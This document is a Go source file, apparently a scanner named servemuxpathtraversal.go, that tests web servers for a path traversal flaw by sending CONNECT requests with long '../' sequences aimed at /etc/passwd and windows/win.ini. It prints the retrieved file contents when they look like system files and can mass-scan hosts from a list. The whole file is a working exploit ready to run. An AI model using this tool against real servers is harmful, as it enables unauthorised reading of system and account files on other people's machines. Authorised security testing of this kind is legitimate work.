package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func GetTargets(file string) []string {
	content, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println("Not a valid list of targets")
		log.Fatal(err)
	}
	targets := strings.Split(string(content), "\n")
	return targets
}

func CheckTarget(target string) {
	colorReset := "\033[0m"
	colorRed := "\033[31m"
	colorGreen := "\033[32m"

	req, err := http.NewRequest("CONNECT", target, nil)
	if err != nil {
		fmt.Println(string(colorRed), target+"; Problem making request... please try again", string(colorReset))
	} else {
		t := http.DefaultTransport.(*http.Transport).Clone()
		t.MaxIdleConns = 100
		t.MaxConnsPerHost = 100
		t.MaxIdleConnsPerHost = 100

		client := &http.Client{
			Timeout:   10 * time.Second,
			Transport: t,
		}

		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(string(colorRed), target+"; Problem making request... please try again", string(colorReset))
		} else {
			if resp.StatusCode == 200 {
				data, _ := ioutil.ReadAll(resp.Body)
				respBodyLength := len(data)
				respBody := string(data)
				if respBodyLength != 0 && (strings.Contains(respBody, "root:") || strings.Contains(respBody, "MAPI") || strings.Contains(respBody, "[intl]")) {
					fmt.Println(string(colorGreen), target+"; Status Code="+strconv.Itoa(resp.StatusCode), string(colorReset))
					fmt.Println(string(colorGreen), "Target looks vulnerable to path traversal!\n", string(colorReset))
					fmt.Println(string(colorGreen), string(data), string(colorReset))
				} else {
					fmt.Println(string(colorRed), target+"; Status Code="+strconv.Itoa(resp.StatusCode)+"; Response Body Length="+strconv.Itoa(respBodyLength), string(colorReset))
				}
			} else {
				fmt.Println(string(colorRed), target+"; Status Code="+strconv.Itoa(resp.StatusCode), string(colorReset))
			}
			resp.Body.Close()
		}
	}
}

func RunChecks(target string) {
	paths := []string{
		"/../../../../../../../../../../../../../../../../etc/passwd",
		"/../../../../../../../../../../../../../../../../windows/win.ini",
	}

	numPaths := len(paths)
	var wg sync.WaitGroup
	wg.Add(numPaths)

	for i := 0; i < numPaths; i++ {
		go func(i int) {
			defer wg.Done()
			CheckTarget(target + paths[i])
		}(i)
	}
	wg.Wait()
}

func RunChecksMultipleTargets(targets []string) {
	numTargets := len(targets)
	var wg sync.WaitGroup
	wg.Add(numTargets)

	for i := 0; i < numTargets; i++ {
		go func(i int) {
			defer wg.Done()
			target := strings.TrimSpace(targets[i])
			RunChecks(target)
		}(i)
	}
	wg.Wait()
}

func main() {
	colorReset := "\033[0m"

	flag.Usage = func() {
		fmt.Println("Usage: \n $ go run servemuxpathtraversal.go -t [target] \n $ go run servemuxpathtraversal.go -i [targets_file]")
		fmt.Println("example target = https://localhost:50000 (http[s]://host[:port])")
	}

	args := os.Args
	file := flag.Bool("i", false, "input file for list of targets in the form 'https://localhost:443' to scan")
	t := flag.Bool("t", false, "single target in the form 'https://localhost:443' to scan")
	flag.Parse()

	if *file {
		targets := GetTargets(args[2])
		fmt.Println(string(colorReset), "Checking for path traversal on a list of targets")
		RunChecksMultipleTargets(targets)
	} else if *t {
		fmt.Println(string(colorReset), "Checking for path traversal on a single target")
		target := args[2]
		RunChecks(target)
	} else {
		flag.Usage()
	}
}
